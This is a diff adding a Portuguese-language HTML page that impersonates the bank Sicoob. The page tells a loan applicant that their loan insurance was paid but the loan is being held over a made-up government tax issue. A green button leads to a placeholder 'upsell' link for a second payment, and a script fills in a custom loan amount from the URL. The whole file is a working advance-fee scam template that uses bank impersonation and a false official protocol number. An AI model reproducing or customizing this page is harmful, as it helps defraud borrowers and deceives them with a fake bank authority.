@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sicoob - Status de Transação</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        body {
+            background-color: #f4f7f6;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Header Sicoob */
+        .header {
+            background-color: #003641;
+            padding: 20px;
+            text-align: center;
+            color: white;
+            font-weight: 600;
+        }
+
+        .content {
+            padding: 25px;
+            flex-grow: 1;
+        }
+
+        /* Sucesso Seguro */
+        .success-box {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .checkmark {
+            width: 60px;
+            height: 60px;
+            background: #7DB61C;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .checkmark svg {
+            fill: white;
+            width: 35px;
+        }
+
+        .success-text {
+            color: #003641;
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        /* Card de Alerta */
+        .alert-card {
+            background-color: #FFF9E6;
+            border-left: 5px solid #FFC107;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .alert-card h3 {
+            color: #856404;
+            font-size: 14px;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+        }
+
+        .alert-card p {
+            font-size: 16px;
+            font-weight: 700;
+            color: #333;
+        }
+
+        /* Texto Institucional */
+        .info-text {
+            font-size: 14px;
+            line-height: 1.6;
+            color: #555;
+            text-align: justify;
+        }
+
+        .protocol {
+            display: block;
+            margin-top: 15px;
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+        }
+
+        /* Botão Rodapé */
+        .footer {
+            padding: 20px;
+            background: #fff;
+            border-top: 1px solid #eee;
+        }
+
+        .btn-upsell {
+            display: block;
+            width: 100%;
+            background-color: #7DB61C;
+            color: white;
+            text-align: center;
+            padding: 18px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 16px;
+            transition: background 0.3s;
+            box-shadow: 0 4px 10px rgba(125, 182, 28, 0.3);
+        }
+
+        .btn-upsell:hover {
+            background-color: #699918;
+        }
+
+        .safe-footer {
+            text-align: center;
+            font-size: 11px;
+            color: #bbb;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        Status de Transação
+    </div>
+
+    <div class="content">
+        <div class="success-box">
+            <div class="checkmark">
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+            </div>
+            <p class="success-text">Seguro Prestamista Pago com Sucesso</p>
+        </div>
+
+        <div class="alert-card">
+            <h3>Atenção</h3>
+            <p>O valor do seu empréstimo de <span id="valor-emprestimo">R$ 12.450,00</span> foi retido.</p>
+        </div>
+
+        <div class="info-text">
+            <p>Prezado cooperado, informamos que o desembolso do seu crédito encontra-se <strong>BLOQUEADO</strong> temporariamente devido a uma <strong>pendência governamental</strong> vinculada ao seu CPF (Divergência Cadastral - Protocolo SEFAZ-2026).</p>
+            <br>
+            <p>Para que o saldo seja liberado automaticamente em sua conta bancária em até 30 minutos, é necessário realizar a regularização desta pendência tributária através do portal de liberação.</p>
+        </div>
+
+        <span class="protocol">Protocolo de Retenção: <b>SIC8832940-B</b></span>
+    </div>
+
+    <div class="footer">
+        <a href="URL_DO_SEU_UPSELL_AQUI" class="btn-upsell">REGULARIZAR PENDÊNCIA</a>
+        <p class="safe-footer">Ambiente Seguro Sicoob • 2026</p>
+    </div>
+</div>
+
+<script>
+    // Se quiser pegar o valor via URL (ex: ?valor=15.000)
+    const urlParams = new URLSearchParams(window.location.search);
+    const valor = urlParams.get('valor');
+    if (valor) {
+        document.getElementById('valor-emprestimo').innerText = 'R$ ' + valor;
+    }
+</script>
+
+</body>
+</html>
